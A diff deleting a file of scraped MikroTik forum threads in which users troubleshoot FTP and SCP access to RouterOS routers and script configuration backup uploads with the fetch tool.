@@ -1,1154 +1,4 @@
 
-===============https://forum.mikrotik.com/viewtopic.php?t=8511================
-Problem with FTP access to MT - MikroTik
-Skip to content
-Search…
-Search
-Quick links
-Unanswered topics
-Active topics
-Search
-FAQ
-The team
-Active topics
-Active topics
-Forum
-Community discussions
-Quick links
-Unanswered topics
-Active topics
-Search
-FAQ
-The team
-Active topics
-Active topics
-Forum
-Search…
-Search
-Register
-Login
-Remember me
-Announcements
-RouterOS
-RouterOS v6 RC and v7 BETA
-RouterOS v7
-Beginner Basics
-General
-Forwarding Protocols
-Wireless Networking
-Scripting
-Virtualization
-Useful user articles
-Other topics
-The Dude
-RouterBOARD hardware
-The User Manager
-SwOS
-Training
-Home
-Forum index
-RouterOS
-General
-L
-R
-Problem with FTP access to MT
-Post Reply
-Print view
-monday
-just joined
-Topic Author
-Posts: 6 Joined: Tue Feb 14, 2006 6:31 pm
-Problem with FTP access to MT
-Quote
-#1
-Fri May 19, 2006 3:00 pm
-I am using FTP to save MT configuration. And when I try to download it to my laptop, I just can not access to ftp directory in MT. It happens only on two MTs, others are working fine with same settings.
-Those two MTs have the same hardware (Intel chipset, celeron 700, 128MB ram, 2GB HDD, onboard VGA).
-As an FTP client I am using total commander.
-And yes, FTP login and pass are properly entered.
-Anyone had such problem?
-Top
-normis
-MikroTik Support
-Posts: 23952 Joined: Fri May 28, 2004 11:04 am
-Location: Riga, Latvia
-Quote
-#2
-Fri May 19, 2006 3:10 pm
-try to connect with winbox, and then use drag-and-drop to download the files from winbox directly. open `files` window, and drag the file to your desktop
-Top
-sergejs
-MikroTik Support
-Posts: 6614 Joined: Thu Mar 31, 2005 3:33 pm
-Location: Riga, Latvia
-Contact:
-Contact sergejs
-Website
-Quote
-#3
-Fri May 19, 2006 4:33 pm
-monday,
-Check that 'ftp' service is enabled at 'ip service print'.
-Check your firewalls that traffic is allowed on both sides.
-Top
-monday
-just joined
-Topic Author
-Posts: 6 Joined: Tue Feb 14, 2006 6:31 pm
-Quote
-#4
-Fri May 19, 2006 10:55 pm
-Normis,
-thank you, it worked by drag&drop in winbox.
-Sergejs,
-ftp service is enabled and there is no firewall problem.
-Top
-viking
-just joined
-Posts: 5 Joined: Sun May 07, 2006 2:27 pm
-ftp problem
-Quote
-#5
-Fri Aug 11, 2006 3:47 pm
-I meet the same problem!
-I use the port 2121,because I have been had a ftp server in lan occupies the prot 21.
-when i login to my MT ftp server,the filezilla returns:
-====================================
-Connecting to 10.0.0.172:2121 ...
-Status:	Connected with 10.0.0.172:2121. Waiting for welcome message...
-Response:	220 Viking FTP server (MikroTik 2.9.6) ready
-Command:	USER viking
-Response:	331 Password required for viking
-Command:	PASS *********
-Response:	230 User viking logged in
-Command:	SYST
-Response:	215 UNIX MikroTik 2.9.6
-Command:	FEAT
-Response:	500 'FEAT': command not understood
-Status:	Connected
-Status:	Retrieving directory listing...
-Command:	PWD
-Response:	257 "/" is current directory
-Command:	TYPE A
-Response:	200 Type set to A
-Command:	PASV
-Response:	227 Entering Passive Mode (10,0,0,172,128,13).
-Command:	LIST
-Response:	425 Can't build data connection
-Error:	Could not retrieve directory listing
-===============================
-then i stop my lan ftp server.and change the port back to 21.the MT ftp server can works well.when the ftp connection established,it create a control connect via port 21,and then use port 22 to transfer data. once i change the port to 2121,the MT ftp server don't set the founction.'This is my personal opinion.' any other opinion?
-Regard....
-Top
-jarosoup
-Long time Member
-Posts: 600 Joined: Sun Aug 22, 2004 9:02 am
-Quote
-#6
-Sat Aug 12, 2006 4:28 am
-I've had problems connecting to Mikrotik FTP using Filezilla client in passive mode...active mode works fine though.
-Top
-pearlguys
-just joined
-Posts: 6 Joined: Tue Dec 20, 2005 8:33 pm
-Quote
-#7
-Tue Aug 15, 2006 10:14 pm
-I have a router that will do the following:
-From the public side:
-WILL NOT work with Microsoft command line ftp client
-WILL work with Microsoft Explorer FTP client
-From the private side:
-WILL work with Microsoft command line ftp client
-WILL work with Microsoft explorer FTP client
-I've no idea what is going on...
-Top
-mynard
-just joined
-Posts: 3 Joined: Mon Apr 02, 2012 10:06 am
-Re: Problem with FTP access to MT
-Quote
-#8
-Thu Jun 14, 2012 1:19 pm
-I had the same issue and found that scp also works.
-I'm using Mac OSX and Linux to manage my routers etc.
-so no option of drag and drop via winbox.
-just use scp from the command line and copy the files to the root,
-/
-i.e.
-root@XBMC-Server:/home/mynard/mipsbe-517# scp * admin@10.0.1.2:/.
-that worked for me.
-L8rz
-~M~
-Top
-Display posts from previous: All posts1 day7 days2 weeks1 month3 months6 months1 year
-Sort by AuthorPost timeSubject AscendingDescending
-Post Reply
-Print view
-Who is online
-Users browsing this forum: No registered users and 29 guests
-Announcements
-RouterOS
-RouterOS v6 RC and v7 BETA
-RouterOS v7
-Beginner Basics
-General
-Forwarding Protocols
-Wireless Networking
-Scripting
-Virtualization
-Useful user articles
-Other topics
-The Dude
-RouterBOARD hardware
-The User Manager
-SwOS
-Training
-Home
-Forum index
-RouterOS
-General
-Delete all board cookies
-The team
-Delete all board cookies
-The team
-Powered by phpBB® Forum Software © phpBB Limited
-Design by SlickThemes
-×
-===============https://forum.mikrotik.com/viewtopic.php?t=104485================
-Sftp issue after upgrading to 6.34 - MikroTik
-Skip to content
-Search…
-Search
-Quick links
-Unanswered topics
-Active topics
-Search
-FAQ
-The team
-Active topics
-Active topics
-Forum
-Community discussions
-Quick links
-Unanswered topics
-Active topics
-Search
-FAQ
-The team
-Active topics
-Active topics
-Forum
-Search…
-Search
-Register
-Login
-Remember me
-Announcements
-RouterOS
-RouterOS v6 RC and v7 BETA
-RouterOS v7
-Beginner Basics
-General
-Forwarding Protocols
-Wireless Networking
-Scripting
-Virtualization
-Useful user articles
-Other topics
-The Dude
-RouterBOARD hardware
-The User Manager
-SwOS
-Training
-Home
-Forum index
-RouterOS
-RouterOS v6 RC and v7 BETA
-L
-R
-Sftp issue after upgrading to 6.34
-Post Reply
-Print view
-polarbear
-just joined
-Topic Author
-Posts: 4 Joined: Wed Feb 03, 2016 3:53 pm
-Sftp issue after upgrading to 6.34
-Quote
-#1
-Wed Feb 03, 2016 3:59 pm
-It's been a while since the last upgrade and I've skipped some versions, so forgive me if I missed something in the announcements.
-I've been using scp to copy over backups from Mikrotik to the host machine on a daily basis. After the upgrade it stopped working with the following error: exec request failed on channel 0 which after some googling revealed that sftp server might be missing.
-Were there any changes in the latest build that might have affected sftp? I've got 2 routers with different configs, both give the same error when trying to scp files from them.
-Top
-polarbear
-just joined
-Topic Author
-Posts: 4 Joined: Wed Feb 03, 2016 3:53 pm
-Re: Sftp issue after upgrading to 6.34
-Quote
-#2
-Mon Feb 08, 2016 9:53 am
-Bump. Anyone?
-Top
-polarbear
-just joined
-Topic Author
-Posts: 4 Joined: Wed Feb 03, 2016 3:53 pm
-Re: Sftp issue after upgrading to 6.34
-Quote
-#3
-Tue Feb 09, 2016 2:18 pm
-Interestingly using sftp with password works without any problems. Here's the bit from the verbose output:
-debug2: channel 0: request env confirm 0
-debug1: Sending command: scp -v -f /backup.bak
-debug2: channel 0: request exec confirm 1
-debug2: fd 3 setting TCP_NODELAY
-debug2: callback done
-debug2: channel 0: open confirm rwindow 2621440 rmax 262144
-debug2: channel_input_status_confirm: type 100 id 0
-exec request failed on channel 0
-Top
-leandrofmilani
-just joined
-Posts: 2 Joined: Fri Feb 12, 2016 12:37 pm
-Re: Sftp issue after upgrading to 6.34
-Quote
-#4
-Fri Feb 12, 2016 12:47 pm
-I have that problem too.
-I tried to upgrade to 6.34.1 but it doesn't solved.
-Top
-steixeira
-just joined
-Posts: 14 Joined: Tue Aug 09, 2011 8:16 pm
-Re: Sftp issue after upgrading to 6.34
-Quote
-#5
-Sat Feb 13, 2016 2:09 am
-I may have a similar issue.
-I have backups copied by ftp(not sftp) each week.
-Today's ftp job failed for all routers v6.34 and above.
-Routers below v6.34 still work.
-My backup utility(Cobian Backup) says:
-2016-02-12 15:15 The user "ftp" has initiated a session on "1.2.3.4:21"
-2016-02-12 15:15 The remote directory has been changed to "/"
-2016-02-12 15:15 Downloading the remote directory "/" to "C:\Users\tempuser\AppData\Local\Temp\Root directory"
-ERR 2016-02-12 15:15 Couldn't get the remote directory list: 'LIST': not enough permissions
-When I try to ftp with a command line in Windows, I get similar:
-C:\Users\tempuser>ftp
-ftp> open 1.2.3.4
-Connected to 1.2.3.4.
-220 Mikrotik FTP server (MikroTik 6.34.1) ready
-User (1.2.3.4:(none)): ftp
-331 Password required for ftp
-Password:
-230 User ftp logged in
-ftp> get log.0.txt
-200 PORT command successful
-550 'RETR': not enough permissions
-ftp>
-Looking at the v6.34 changelog, maybe it's this?
-ssh, ftp - make read, write user group policy aware
-But is this a bug or is there a workaround?
-Top
-Sob
-Forum Guru
-Posts: 4157 Joined: Mon Apr 20, 2009 9:11 pm
-Re: Sftp issue after upgrading to 6.34
-Quote
-#6
-Sat Feb 13, 2016 3:54 am
-You found the answer. If your ftp or ssh user belongs to group with just ftp/ssh policy, it won't be able to do anything useful. Add read and write as needed and problem solved. Also sensitive seems to be required if you want to access *.backup.
-Top
-steixeira
-just joined
-Posts: 14 Joined: Tue Aug 09, 2011 8:16 pm
-Re: Sftp issue after upgrading to 6.34
-Quote
-#7
-Wed Feb 17, 2016 8:30 pm
-Read policy was what was required.
-I would assume the write policy would be required if I wanted to use ftp put command, but I am only getting backups.
-My mistake.
-I had already set up the group with ftp and sensitive policy.
-I thought I had enabled all policies for the group the user belongs to during my testing to confirm the permissions issue, but I must have missed something.
-So, as of 6.34, read and/or write policy is now also required.
-Thanks!
-Top
-polarbear
-just joined
-Topic Author
-Posts: 4 Joined: Wed Feb 03, 2016 3:53 pm
-Re: Sftp issue after upgrading to 6.34
-Quote
-#8
-Mon Feb 22, 2016 11:54 am
-Amazing! Thanks for the find!
-Here's the full policy needed to get it: ssh,ftp,read,write,sensitive
-Top
-leandrofmilani
-just joined
-Posts: 2 Joined: Fri Feb 12, 2016 12:37 pm
-Re: Sftp issue after upgrading to 6.34
-Quote
-#9
-Tue Feb 23, 2016 2:19 pm
-I used an user with full permissions but it didn't work. Now I upgraded to version 6.34.2 and my problem was solved.
-Top
-Display posts from previous: All posts1 day7 days2 weeks1 month3 months6 months1 year
-Sort by AuthorPost timeSubject AscendingDescending
-Post Reply
-Print view
-Who is online
-Users browsing this forum: No registered users and 9 guests
-Announcements
-RouterOS
-RouterOS v6 RC and v7 BETA
-RouterOS v7
-Beginner Basics
-General
-Forwarding Protocols
-Wireless Networking
-Scripting
-Virtualization
-Useful user articles
-Other topics
-The Dude
-RouterBOARD hardware
-The User Manager
-SwOS
-Training
-Home
-Forum index
-RouterOS
-RouterOS v6 RC and v7 BETA
-Delete all board cookies
-The team
-Delete all board cookies
-The team
-Powered by phpBB® Forum Software © phpBB Limited
-Design by SlickThemes
-×
-===============https://forum.mikrotik.com/viewtopic.php?t=63061================
-Mikrotik internal FTP server error 425 Problem - MikroTik
-Skip to content
-Search…
-Search
-Quick links
-Unanswered topics
-Active topics
-Search
-FAQ
-The team
-Active topics
-Active topics
-Forum
-Community discussions
-Quick links
-Unanswered topics
-Active topics
-Search
-FAQ
-The team
-Active topics
-Active topics
-Forum
-Search…
-Search
-Register
-Login
-Remember me
-Announcements
-RouterOS
-RouterOS v6 RC and v7 BETA
-RouterOS v7
-Beginner Basics
-General
-Forwarding Protocols
-Wireless Networking
-Scripting
-Virtualization
-Useful user articles
-Other topics
-The Dude
-RouterBOARD hardware
-The User Manager
-SwOS
-Training
-Home
-Forum index
-RouterOS
-General
-L
-R
-Mikrotik internal FTP server error 425 Problem
-Post Reply
-Print view
-spectral0
-just joined
-Topic Author
-Posts: 4 Joined: Sun Jun 24, 2012 4:38 pm
-Mikrotik internal FTP server error 425 Problem
-Quote
-#1
-Sun Jun 24, 2012 5:10 pm
-Hi guys!
-I have one RB 433 AP that i would like to backup using automated windows cli ftp client. I can log in to the AP's FTP server but some weird things happened. I can execute commands like pwd, cd, but this AP won't let me list any file as well as upload/download.
-Code: Select allftp> o 10.2.0.27 21
-Connected to 10.2.0.27.
-220 AP 10 FTP server (MikroTik 5.6) ready
-User (10.2.0.27:(none)): backup
-331 Password required for backup
-Password:
-230 User backup logged in
-ftp> pwd
-257 "/" is current directory
-ftp> cd skins
-250 CWD command successful
-ftp> ls
-425 Can't build data connection
-ftp> cd /
-250 CWD command successful
-ftp> ls
-425 Can't build data connection
-ftp> lcd c:\temp
-Local directory now C:\temp.
-ftp> put somescript.rsc
-425 Can't open data connection
-ftp>
-FTP service and service port is active.
-Code: Select all[admin@AP 10] > ip firewall service pr
-Flags: X - disabled, I - invalid
-#
-NAME
-PORT
-0 I ftp
-21
-1 X tftp
-69
-2 X irc
-6667
-3 X h323
-4 X sip
-5060
-5061
-5 X pptp
-[admin@AP 10] > ip service pr
-Flags: X - disabled, I - invalid
-#
-NAME
-PORT ADDRESS
-CERTIFICATE
-0
-telnet
-23
-1
-ftp
-21 10.0.0.0/8
-2 X www
-80
-3 X ssh
-22
-4 X www-ssl
-443
-none
-5 X api
-8728
-6
-winbox
-8291
-That's what it looks like. I can download/upload using filezilla ftp client but not windows ftp.exe. Note that i accessed this AP from my internal network and no firewall/NAT exists between my PC and this AP.
-Can anyone enlighten me? Any help would be appreciated. Thanks.
-Top
-jandafields
-Forum Guru
-Posts: 1513 Joined: Mon Sep 19, 2005 6:12 pm
-Re: Mikrotik internal FTP server error 425 Problem
-Quote
-#2
-Tue Jun 26, 2012 6:08 pm
-Hi guys!
-I have one RB 433 AP that i would like to backup using automated windows cli ftp client. I can log in to the AP's FTP server but some weird things happened. I can execute commands like pwd, cd, but this AP won't let me list any file as well as upload/download.
-Code: Select allftp> o 10.2.0.27 21
-Connected to 10.2.0.27.
-220 AP 10 FTP server (MikroTik 5.6) ready
-User (10.2.0.27:(none)): backup
-331 Password required for backup
-Password:
-230 User backup logged in
-ftp> pwd
-257 "/" is current directory
-ftp> cd skins
-250 CWD command successful
-ftp> ls
-425 Can't build data connection
-ftp> cd /
-250 CWD command successful
-ftp> ls
-425 Can't build data connection
-ftp> lcd c:\temp
-Local directory now C:\temp.
-ftp> put somescript.rsc
-425 Can't open data connection
-ftp>
-FTP service and service port is active.
-Code: Select all[admin@AP 10] > ip firewall service pr
-Flags: X - disabled, I - invalid
-#
-NAME
-PORT
-0 I ftp
-21
-1 X tftp
-69
-2 X irc
-6667
-3 X h323
-4 X sip
-5060
-5061
-5 X pptp
-[admin@AP 10] > ip service pr
-Flags: X - disabled, I - invalid
-#
-NAME
-PORT ADDRESS
-CERTIFICATE
-0
-telnet
-23
-1
-ftp
-21 10.0.0.0/8
-2 X www
-80
-3 X ssh
-22
-4 X www-ssl
-443
-none
-5 X api
-8728
-6
-winbox
-8291
-That's what it looks like. I can download/upload using filezilla ftp client but not windows ftp.exe. Note that i accessed this AP from my internal network and no firewall/NAT exists between my PC and this AP.
-Can anyone enlighten me? Any help would be appreciated. Thanks.
-This is an active versus passive connection issue.
-FileZilla will switch to pasv mode without you knowing it, so it works fine.
-The windows ftp.exe will not switch automatically.
-Here are instructions to make ftp.exe work in passive mode:
-http://myonecent.wordpress.com/2010/11/ ... -transfer/
-Top
-spectral0
-just joined
-Topic Author
-Posts: 4 Joined: Sun Jun 24, 2012 4:38 pm
-Re: Mikrotik internal FTP server error 425 Problem
-Quote
-#3
-Thu Jun 28, 2012 3:11 pm
-Thanks for replying jan, however switching to passive mode doesn't solve the problem.
-Code: Select allftp> o 10.254.0.2
-Connected to 10.254.0.2.
-220 AP 10 FTP server (MikroTik 5.6) ready
-User (10.254.0.2:(none)): backup
-331 Password required for backup
-Password:
-230 User backup logged in
-ftp> quote pasv
-227 Entering Passive Mode (10,254,0,2,236,203).
-ftp> ls
-425 Can't build data connection
-ftp> dir
-425 Can't build data connection
-ftp> cd skins
-250 CWD command successful
-ftp> ls
-425 Can't build data connection
-ftp> bin
-200 Type set to I
-ftp> ls
-425 Can't build data connection
-The same error 425 still occurs.
-Top
-jandafields
-Forum Guru
-Posts: 1513 Joined: Mon Sep 19, 2005 6:12 pm
-Re: Mikrotik internal FTP server error 425 Problem
-Quote
-#4
-Fri Jun 29, 2012 3:55 pm
-The fact remains, error 425 is a pasv/active issue, and is a problem with your FTP client, not with the Mikrotik.
-Perhaps you should search for a different ftp client that works properly.
-Top
-spectral0
-just joined
-Topic Author
-Posts: 4 Joined: Sun Jun 24, 2012 4:38 pm
-Re: Mikrotik internal FTP server error 425 Problem
-Quote
-#5
-Wed Jul 04, 2012 10:11 am
-Thanks for the info, jan!
-I tried to switch some ftp clients and somehow ftp.exe issue solved with that AP. However, i found out that another AP of mine also have the same behavior that won't be solved with the same approach.
-Do you have any suggestion which ftp client that can easily scripted for automatic backup job?
-Top
-Mashimoto
-Frequent Visitor
-Posts: 51 Joined: Thu Feb 24, 2011 3:55 pm
-Re: Mikrotik internal FTP server error 425 Problem
-Quote
-#6
-Fri Oct 19, 2012 2:46 pm
-I also have this issue with Filezilla.
-Can ftp within LAN but not outside of it. 425 responses all the time...
-Once it went through though, but didn't let me download what i needed
-Top
-NelsonM
-just joined
-Posts: 2 Joined: Wed Jun 05, 2013 10:43 pm
-Re: Mikrotik internal FTP server error 425 Problem
-Quote
-#7
-Wed Jun 05, 2013 10:46 pm
-I had the same problem.
-Issue was I had no route to one of the IP Addresses on the Mikrotik.
-Distributing the route fixed the problem.
-Top
-Display posts from previous: All posts1 day7 days2 weeks1 month3 months6 months1 year
-Sort by AuthorPost timeSubject AscendingDescending
-Post Reply
-Print view
-Who is online
-Users browsing this forum: Bing [Bot] and 29 guests
-Announcements
-RouterOS
-RouterOS v6 RC and v7 BETA
-RouterOS v7
-Beginner Basics
-General
-Forwarding Protocols
-Wireless Networking
-Scripting
-Virtualization
-Useful user articles
-Other topics
-The Dude
-RouterBOARD hardware
-The User Manager
-SwOS
-Training
-Home
-Forum index
-RouterOS
-General
-Delete all board cookies
-The team
-Delete all board cookies
-The team
-Powered by phpBB® Forum Software © phpBB Limited
-Design by SlickThemes
-×
-===============https://forum.mikrotik.com/viewtopic.php?t=38660================
-FTP File transfer from Mikrotik to non Mikrotik FTP Server - MikroTik
-Skip to content
-Search…
-Search
-Quick links
-Unanswered topics
-Active topics
-Search
-FAQ
-The team
-Active topics
-Active topics
-Forum
-Community discussions
-Quick links
-Unanswered topics
-Active topics
-Search
-FAQ
-The team
-Active topics
-Active topics
-Forum
-Search…
-Search
-Register
-Login
-Remember me
-Announcements
-RouterOS
-RouterOS v6 RC and v7 BETA
-RouterOS v7
-Beginner Basics
-General
-Forwarding Protocols
-Wireless Networking
-Scripting
-Virtualization
-Useful user articles
-Other topics
-The Dude
-RouterBOARD hardware
-The User Manager
-SwOS
-Training
-Home
-Forum index
-RouterOS
-Scripting
-L
-R
-FTP File transfer from Mikrotik to non Mikrotik FTP Server
-Post Reply
-Print view
-synapsis
-newbie
-Topic Author
-Posts: 26 Joined: Thu Jan 13, 2005 7:41 am
-Location: Canberra, Australia
-FTP File transfer from Mikrotik to non Mikrotik FTP Server
-Quote
-#1
-Tue Jan 26, 2010 9:25 am
-Hi there
-I want to transfer a data file that some other scripts I have written create, from a Mikrotik Router to a non Mikrotik FTP Server using a script and scheduling it to run on a periodic basis or to run when certain conditions are satisfied.
-In essence I want the Mikrotik Router to act as an FTP Client, not an FTP Server.
-I've played around with fetch and I haven't been able to get it working in this manner and the documentation in the manual is very lacking in detail so I don't know if this is possible or not.
-(BTW, yes technically I could write a script that runs on the FTP Server and pulls the file from the Mikrotik Router, but this would only satisfy the periodic transfer requirement.
-It would not satisfy my requirement to push the file up to a server when certain conditions are met.)
-Anyone have any thoughts?
-Can fetch operate in this manner or should I use a different approach?
-R
-Top
-mrz
-MikroTik Support
-Posts: 5841 Joined: Wed Feb 07, 2007 12:45 pm
-Location: Latvia
-Contact:
-Contact mrz
-Website
-Re: FTP File transfer from Mikrotik to non Mikrotik FTP Server
-Quote
-#2
-Tue Jan 26, 2010 9:50 am
-Fetch can be used only to download files from servers, it cannot be used to send files.
-You have to think of something else, send files by email or run script on ftp server to get files.
-Top
-dssmiktik
-Forum Veteran
-Posts: 732 Joined: Fri Aug 17, 2007 8:42 am
-Re: FTP File transfer from Mikrotik to non Mikrotik FTP Server
-Quote
-#3
-Tue Jan 26, 2010 9:51 am
-If you have an ssh client on your ftp server, you can execute a script on Mikrotik through ssh, then parse the results on your ftp server.
-If certain conditions are met, then ftp server would then "pull" the file(s) from the Mikrotik.
-To autologin to the Mikrotik using DSA keys, see: http://wiki.mikrotik.com/wiki/Use_SSH_t ... y_login%29
-Ex. On your ftp server, create a bash script:
-This is only an example to demonstrate the concept.
-Code: Select all#!/bin/bash
-MIKCMD=":if ([/interface ethernet get LAN disabled] = true) do={:put \"DISABLEDMESSAGE\"} else={:put \"ENABLEDMESSAGE\"}"
-MIKRESULT="`ssh user:pass@router '$MIKCMD'`"
-if [ "$MIKRESULT"
-== "DISABLEDMESSAGE" ]; then
-# Any linux commands to execute if interface is disabled
-echo "Interface is disabled"
-fi
-if [ "$MIKRESULT"
-== "ENABLEDMESSAGE" ]; then
-# Any linux commands to execute if interface is enabled
-echo "Interface is enabled"
-fi
-Then, you can set this script to run via cron on your ftp server.
-Top
-sw0rdf1sh
-Frequent Visitor
-Posts: 50 Joined: Sun Nov 28, 2010 6:16 pm
-Re: FTP File transfer from Mikrotik to non Mikrotik FTP Serv
-Quote
-#4
-Mon Feb 28, 2011 1:35 pm
-Actually you can use fetch toll to send files in a workaround.
-Fetch as mentioned is only used to download.But if you download a php page with the correct values in the title you can send these values to a mysql database or even store it in text files or even store graphs on a chmod 777 location (where the php page is stored).
-Haven't tried to send a file yet.I think it's possible but I am lacking the php knowledge. I would like to send the png's of the graphs every 2 or 4 hours.Right now I am only sending some values as mac addresses or users online...
-Top
-dssmiktik
-Forum Veteran
-Posts: 732 Joined: Fri Aug 17, 2007 8:42 am
-Re: FTP File transfer from Mikrotik to non Mikrotik FTP Serv
-Quote
-#5
-Tue Mar 01, 2011 1:34 am
-I guess you could also use fetch in GET mode to trigger a remote php script to ftp files from the router.
-I haven't tested this, but if you run php on the back-end, it should be able to ftp into the router.
-Ex.
-Code: Select all/tool fetch address=a.b.c.d src-path="/mikchanged.php?action=pullgraphs" dst-path="pullgraphs.txt" mode=http
-Then have the php script return a code, which you can now parse pullgraphs.txt from a RouterOS script to determine status.
-Hope this makes sense.
-I like this approach as it still pulls, but in special cases can also be triggered.
-In the end, you have a central server to pull files/execute commands.
-The router in this case is will just trigger a pull immediately if required.
-Doug
-Top
-mrz
-MikroTik Support
-Posts: 5841 Joined: Wed Feb 07, 2007 12:45 pm
-Location: Latvia
-Contact:
-Contact mrz
-Website
-Re: FTP File transfer from Mikrotik to non Mikrotik FTP Serv
-Quote
-#6
-Tue Mar 01, 2011 9:43 am
-Actually starting from one of the v5RC versions fetch can be used to upload files.
-http://wiki.mikrotik.com/wiki/Manual:To ... h#Examples
-Top
-xr4t3d85
-just joined
-Posts: 2 Joined: Sun Jul 02, 2017 2:15 pm
-Re: FTP File transfer from Mikrotik to non Mikrotik FTP Server
-Quote
-#7
-Fri May 04, 2018 4:53 am
-Hi there
-I want to transfer a data file that some other scripts I have written create, from a Mikrotik Router to a non Mikrotik FTP Server using a script and scheduling it to run on a periodic basis or to run when certain conditions are satisfied.
-In essence I want the Mikrotik Router to act as an FTP Client, not an FTP Server.
-I've played around with fetch and I haven't been able to get it working in this manner and the documentation in the manual is very lacking in detail so I don't know if this is possible or not.
-(BTW, yes technically I could write a script that runs on the FTP Server and pulls the file from the Mikrotik Router, but this would only satisfy the periodic transfer requirement.
-It would not satisfy my requirement to push the file up to a server when certain conditions are met.)
-Anyone have any thoughts?
-Can fetch operate in this manner or should I use a different approach?
-R
-I was able to successfully get the Mikrotik router to successfully upload a configuration file to an FTP Server. Start with the /tool fetch command below and you can begin molding the script you need to complete your task. The script I have built now exports the running config, uploads to FTP Server and then deletes the config copy locally.
-# Version info #
-RouterBoard Firmware: 6.42
-Mikrotik Version: 6.42
-Code: Select all/tool fetch address=10.0.0.10 src-path=Filename.rsc user=admin mode=ftp password=Y0rP@55word! dst-path="/Folder01/Filename.rsc" upload=yes;
-Top
-topmktwww
-just joined
-Posts: 4 Joined: Wed Feb 28, 2018 5:12 pm
-Re: FTP File transfer from Mikrotik to non Mikrotik FTP Server
-Quote
-#8
-Thu Feb 07, 2019 11:23 pm
-Hi there
-I want to transfer a data file that some other scripts I have written create, from a Mikrotik Router to a non Mikrotik FTP Server using a script and scheduling it to run on a periodic basis or to run when certain conditions are satisfied.
-In essence I want the Mikrotik Router to act as an FTP Client, not an FTP Server.
-I've played around with fetch and I haven't been able to get it working in this manner and the documentation in the manual is very lacking in detail so I don't know if this is possible or not.
-(BTW, yes technically I could write a script that runs on the FTP Server and pulls the file from the Mikrotik Router, but this would only satisfy the periodic transfer requirement.
-It would not satisfy my requirement to push the file up to a server when certain conditions are met.)
-Anyone have any thoughts?
-Can fetch operate in this manner or should I use a different approach?
-R
-I was able to successfully get the Mikrotik router to successfully upload a configuration file to an FTP Server. Start with the /tool fetch command below and you can begin molding the script you need to complete your task. The script I have built now exports the running config, uploads to FTP Server and then deletes the config copy locally.
-# Version info #
-RouterBoard Firmware: 6.42
-Mikrotik Version: 6.42
-Code: Select all/tool fetch address=10.0.0.10 src-path=Filename.rsc user=admin mode=ftp password=Y0rP@55word! dst-path="/Folder01/Filename.rsc" upload=yes;
-I am trying to send the log files, I have several files, and trying with a commom string, like * is not working, in fact I want to send all .log files and also delete then after the upload, any idea hot to adapt the script? I have tried many things but I always receive the same answer: failure: Unrecognized FTP server response: 553 Could not create file.
-Top
-behzad24
-just joined
-Posts: 1 Joined: Mon May 06, 2019 10:08 pm
-Re: FTP File transfer from Mikrotik to non Mikrotik FTP Server
-Quote
-#9
-Tue May 07, 2019 1:32 pm
-hi
-I have a Mikrotik sq Radio that has been disabled by its jumper reset, and also i forgotten password. any solution ?, and how i can reset or reinstalling (netinstall) it?
-best regards,
-behzad
-Top
-Display posts from previous: All posts1 day7 days2 weeks1 month3 months6 months1 year
-Sort by AuthorPost timeSubject AscendingDescending
-Post Reply
-Print view
-Who is online
-Users browsing this forum: No registered users and 12 guests
-Announcements
-RouterOS
-RouterOS v6 RC and v7 BETA
-RouterOS v7
-Beginner Basics
-General
-Forwarding Protocols
-Wireless Networking
-Scripting
-Virtualization
-Useful user articles
-Other topics
-The Dude
-RouterBOARD hardware
-The User Manager
-SwOS
-Training
-Home
-Forum index
-RouterOS
-Scripting
-Delete all board cookies
-The team
-Delete all board cookies
-The team
-Powered by phpBB® Forum Software © phpBB Limited
-Design by SlickThemes
-×
-===============https://forum.mikrotik.com/viewtopic.php?t=24969================
-Ftp server on mikrotik step by step guide - MikroTik
-Skip to content
-Search…
-Search
-Quick links
-Unanswered topics
-Active topics
-Search
-FAQ
-The team
-Active topics
-Active topics
-Forum
-Community discussions
-Quick links
-Unanswered topics
-Active topics
-Search
-FAQ
-The team
-Active topics
-Active topics
-Forum
-Search…
-Search
-Register
-Login
-Remember me
-Announcements
-RouterOS
-RouterOS v6 RC and v7 BETA
-RouterOS v7
-Beginner Basics
-General
-Forwarding Protocols
-Wireless Networking
-Scripting
-Virtualization
-Useful user articles
-Other topics
-The Dude
-RouterBOARD hardware
-The User Manager
-SwOS
-Training
-Home
-Forum index
-RouterOS
-Beginner Basics
-L
-R
-Ftp server on mikrotik step by step guide
-Locked
-Print view
-imaljko4
-Member Candidate
-Topic Author
-Posts: 247 Joined: Fri Apr 25, 2008 6:52 pm
-Ftp server on mikrotik step by step guide
-#1
-Fri Jun 27, 2008 10:59 pm
-Where to find a step by step guide, how to setup ftp server with mikrotik.
-I never used a ftp server so doesnt know how it works.
-When accesing ROuterboard files over winbox it dosnt work corectly, often the files are copide to some directories i didnt copy them to, and then i have to search for them, or sometimes it doesnt copy at all. So i want to setup FTP server hope with it it works better.
-thanks
-Top
-ashish
-Long time Member
-Posts: 550 Joined: Mon Feb 12, 2007 5:50 am
-Location: Virginia, USA.
-Re: Ftp server on mikrotik step by step guide
-#2
-Sat Jun 28, 2008 6:10 am
-By default the FTP service is unable on Router.
-Pl check /ip services
-ftp://Router IP address
-- AP - ASHISH PATEL - 757 309 0236 -
-Top
-imaljko4
-Member Candidate
-Topic Author
-Posts: 247 Joined: Fri Apr 25, 2008 6:52 pm
-Re: Ftp server on mikrotik step by step guide
-#3
-Sat Jun 28, 2008 1:20 pm
-By default the FTP service is unable on Router.
-Pl check /ip services
-ftp://Router IP address
-Ok i have entered now the ftp server over Mozilla explorer(browser), but how can i now copy, delete or move files in the ftp server?
-Thanks
-Top
-ashish
-Long time Member
-Posts: 550 Joined: Mon Feb 12, 2007 5:50 am
-Location: Virginia, USA.
-Re: Ftp server on mikrotik step by step guide
-#4
-Sat Jun 28, 2008 1:31 pm
-Use any FTP Software to connect the Router or you can open the FTP server in My Computer Window instead of explorer
-You can able to add, delete the files
-Open My computer
-in address bar ftp://router IP address
-- AP - ASHISH PATEL - 757 309 0236 -
-Top
-imaljko4
-Member Candidate
-Topic Author
-Posts: 247 Joined: Fri Apr 25, 2008 6:52 pm
-Re: Ftp server on mikrotik step by step guide
-#5
-Sat Jun 28, 2008 1:41 pm
-Thanks that worked!!
-Top
-Display posts from previous: All posts1 day7 days2 weeks1 month3 months6 months1 year
-Sort by AuthorPost timeSubject AscendingDescending
-Locked
-Print view
-Who is online
-Users browsing this forum: No registered users and 21 guests
-Announcements
-RouterOS
-RouterOS v6 RC and v7 BETA
-RouterOS v7
-Beginner Basics
-General
-Forwarding Protocols
-Wireless Networking
-Scripting
-Virtualization
-Useful user articles
-Other topics
-The Dude
-RouterBOARD hardware
-The User Manager
